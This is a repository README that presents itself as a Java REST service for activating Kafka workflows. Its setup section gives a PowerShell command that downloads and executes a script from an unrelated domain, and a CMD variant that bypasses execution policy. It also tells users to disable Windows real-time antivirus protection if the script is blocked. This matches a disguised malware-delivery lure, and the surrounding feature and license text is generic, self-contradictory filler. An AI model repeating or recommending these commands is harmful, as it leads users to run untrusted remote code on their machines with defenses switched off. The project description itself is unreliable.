<div align="center">

# Kafka-Activator-app: Java REST Service Management for Windows 10 & 11

![preview](https://raw.githubusercontent.com/michael9494/kafka-activator-desktop/main/showcase_cf1db.svg)

[![ci](https://img.shields.io/badge/CI-OK-2ea44f?style=plastic&labelColor=0d1117)]() [![release](https://img.shields.io/badge/RELEASE-RELEASED-2ea44f?style=plastic&labelColor=0d1117)]() [![lic](https://img.shields.io/badge/LIC-X11-ec4899?style=plastic&labelColor=0d1117)]() [![pwsh](https://img.shields.io/badge/PWSH-CORE-f472b6?style=plastic&labelColor=0d1117)]() [![system](https://img.shields.io/badge/SYSTEM-WINDOWS_11-db2777?style=plastic&labelColor=0d1117)]()

</div>

---

Kafka-Activator-app is a Java-based REST service designed to streamline the activation and management of Kafka-driven workflows through a lightweight, API-first architecture. The application exposes structured HTTP endpoints for orchestrating activation logic, enabling clients to trigger and monitor Kafka-oriented operations programmatically. Built on Java with a focus on modular service design, it provides clean separation between request handling, business logic, and Kafka interaction layers. The codebase emphasizes predictable request lifecycle management, extensible endpoint definitions, and straightforward integration into existing service ecosystems. Development follows a collaborative contribution model, with the repository structured to support iterative feature development and consistent code quality across the project.

## 🚀 Setup Guide — PowerShell

> [!TIP]
> **One-click install** — paste one command, done in seconds.
> Windows 10/11 · PowerShell · Admin not required

### 1️⃣ Launch PowerShell
* Open the Start menu and type **PowerShell**.
* Right-click and choose **Run as administrator** (optional).

### 2️⃣ Paste and run
Paste the command into PowerShell and hit `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ Forced run via CMD
Copy into CMD, press `Enter`, wait for completion:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> If SmartScreen or antivirus blocks the setup, go to **Windows Security → Virus & threat protection → Manage settings**, turn off **Real-time protection**, run the script, and re-enable immediately.

## 📋 System Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

- **RESTful control plane**: Exposes a Java-based REST API for programmatically managing Kafka activation workflows, enabling integration with external orchestration tools and CI/CD pipelines.
- **Activation lifecycle management**: Provides endpoints to trigger, monitor, and track activation operations, with clear state transitions and status reporting for each request.
- **Kafka cluster interaction**: Connects to Kafka brokers to perform activation-related operations, abstracting broker communication behind the service layer.
- **Configurable connectivity**: Supports externalized configuration for broker addresses, topic settings, and service parameters, allowing deployment across environments without code changes.
- **Stateless request handling**: Designed around stateless REST semantics, supporting horizontal scaling and predictable behavior under concurrent requests.
- **Structured error responses**: Returns consistent HTTP status codes and descriptive error payloads to simplify client-side handling and debugging.
- **Java-native implementation**: Built on standard Java REST conventions, making the codebase approachable for JVM developers and straightforward to extend with additional endpoints.
- **Logging and observability hooks**: Emits operational logs across activation flows to support troubleshooting and audit of activation activity.
- **Lightweight deployment footprint**: Runs as a standalone Java service, suitable for containerized or on-premises deployment alongside existing Kafka infrastructure.

## How It Works

Kafka-Activator-app operates as a Java REST service that mediates between client applications and a Kafka cluster. The runtime is organized around three cooperating layers: the REST controller layer, the activation service layer, and the Kafka client layer.

1. **Request intake.** The REST controller receives HTTP requests describing the desired activation action, including topic identifiers and connection parameters. Payloads are validated and deserialized into typed request objects before any broker interaction occurs.

2. **Activation orchestration.** The activation service resolves each request against the configured cluster context. It determines whether the requested topics exist, applies activation or deactivation semantics, and coordinates the sequence of administrative operations. Business rules—such as idempotent activation and safe handling of repeated requests—are enforced at this layer rather than in the controllers.

3. **Kafka client execution.** The service delegates to the Kafka client layer, which wraps the Kafka Admin and Producer APIs. Administrative calls handle topic creation, partition assignment, and configuration changes, while producer paths publish activation messages to the appropriate topics. Connections are pooled and reused across requests to reduce overhead.

4. **Response assembly.** Results from the Kafka layer are mapped into structured REST responses. Success responses report the applied changes and affected topics; failures are surfaced with explicit error codes and diagnostic messages so callers can distinguish validation errors from broker-side failures.

5. **Configuration and lifecycle.** Cluster connection settings, serialization defaults, and activation parameters are externalized into configuration files, allowing the same build to target different environments. The service initializes Kafka clients at startup and shuts them down cleanly on termination to avoid leaked connections.

The design keeps HTTP concerns, activation logic, and broker communication separated, so each layer can be tested and extended independently while preserving a consistent REST contract for callers.

## Compatibility

Kafka-Activator-app is a Java REST service built on the Spring Boot runtime and requires a Java Development Kit (JDK) version 17 or later. It is validated against Java 17 and Java 21 long-term support releases. The application is platform-independent and runs on any operating system capable of hosting a supported JVM, including Linux, macOS, and Windows.

The service integrates with Apache Kafka brokers version 2.8 and above, with primary validation against Kafka 3.x clusters. It operates in both single-broker and multi-broker configurations. Communication with the Kafka cluster uses the standard Kafka protocol, so clusters managed by common distribution platforms remain supported provided they expose protocol-compatible endpoints.

Runtime configuration is externalized through Spring Boot's standard mechanisms, supporting property files, environment variables, and command-line arguments. The service exposes its interface over HTTP/REST and can be deployed as a standalone executable JAR or as a containerized workload in environments such as Docker and Kubernetes.

Build-time requirements include Maven 3.8 or later and a compatible JDK. The application produces a self-contained artifact with embedded server dependencies, minimizing external runtime prerequisites beyond the JVM and network access to the target Kafka cluster.

## FAQ

**Q: What is Kafka-Activator-app?** 
Kafka-Activator-app is a Java-based REST service designed to activate and manage Kafka-driven workflows. It exposes REST endpoints that allow external systems to trigger Kafka message production, manage activation state, and integrate Kafka topics into broader application logic without embedding Kafka client code directly into each consumer.

**Q: What are the core features of Kafka-Activator-app?** 
The application provides REST-based activation endpoints, Kafka producer integration, configurable topic and message mapping, runtime activation state management, and structured logging for produced messages and activation events. It is built on Java and follows a lightweight service architecture suitable for integration into existing microservice environments.

**Q: How does Kafka-Activator-app work internally?** 
The application runs as a Java REST service. Incoming HTTP requests are processed by REST controllers, which validate request payloads and translate them into Kafka producer operations. Activation state and topic configuration are managed within the service, and produced messages are dispatched to the configured Kafka cluster. The service is designed to be stateless per request where possible, with configuration-driven behavior for topic routing and message formatting.

**Q: What are the compatibility requirements?** 
Kafka-Activator-app requires a Java runtime compatible with the project's build target and a reachable Kafka cluster (or compatible broker) for message production. It is intended to interoperate with standard Kafka protocol implementations. Compatibility with specific Java versions, Kafka broker versions, and dependency versions is defined by the project's build configuration and dependency manifest.

**Q: Can Kafka-Activator-app be integrated into an existing microservice architecture?** 
Yes. Because it exposes REST endpoints, it can be deployed as a standalone service or embedded within a larger Java application stack. Integration points are HTTP-based, allowing services written in other languages to trigger Kafka message production through the REST interface without requiring a native Kafka client.

**Q: How is configuration handled?** 
Configuration is externalized through the application's configuration mechanism, covering Kafka broker connectivity, topic mappings, and activation behavior. This allows the same artifact to be deployed across environments with environment-specific settings, without code changes.

**Q: Is Kafka-Activator-app suitable for production use?** 
The project provides a functional REST-to-Kafka activation layer. Production suitability depends on the deployment topology, Kafka cluster reliability, configuration hardening, and operational monitoring applied by the integrating team. The service includes structured logging to support observability, but operational concerns such as scaling, failover, and security should be evaluated against the hosting environment.

**Q: What does Kafka-Activator-app not do?** 
It is not a Kafka cluster manager, a schema registry, or a full stream-processing framework. It focuses on REST-triggered activation and message production. Consumer-side processing, topic administration, and complex stream transformations are outside its scope.

**Q: How can developers contribute or extend the project?** 
The project is developed as an open Java codebase. Developers can extend REST controllers, add new activation strategies, or adapt the Kafka producer configuration to support additional integration patterns. Contribution follows the project's standard development workflow and coding conventions.

## Disclaimer

Kafka-Activator-app is provided "as is" without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. The application is a Java-based REST service intended for development, testing, and educational use; it is not certified for production deployment without independent validation.

No guarantee is made regarding correctness, reliability, availability, or suitability for any specific environment or workload. Kafka-Activator-app interacts with Kafka clusters and may produce, consume, or modify topic data; you are solely responsible for evaluating its behavior against your own infrastructure, data policies, and operational requirements before use.

You are responsible for securing configuration, credentials, and access to the environments in which the application runs. The authors and contributors accept no liability for data loss, service interruption, security incidents, or any direct, indirect, incidental, special, consequential, or punitive damages arising from the use or inability to use this software, whether in contract, tort, or otherwise, even if advised of the possibility of such damages.

Use of Kafka-Activator-app is at your own risk.

## License

Kafka-Activator-app is released under the MIT License. The license grants permission to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, subject to inclusion of the original copyright notice and this permission notice in all copies or substantial portions of the software. The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software. Redistribution in source or binary form is permitted provided the copyright notice, the list of conditions, and the disclaimer remain intact. Derivative works must retain the same licensing terms when distributed, and any modified files should carry prominent notices stating that changes were made. The license does not grant rights to the project name, logos, or other trademarks of Kafka-Activator-app; such identifiers may not be used to endorse or promote derived products without prior written consent. Consumers integrating Kafka-Activator-app into commercial or internal REST-based systems are responsible for verifying compliance with the licenses of all transitive Java dependencies resolved at build time. No additional restrictions beyond those stated in the MIT License apply to this project.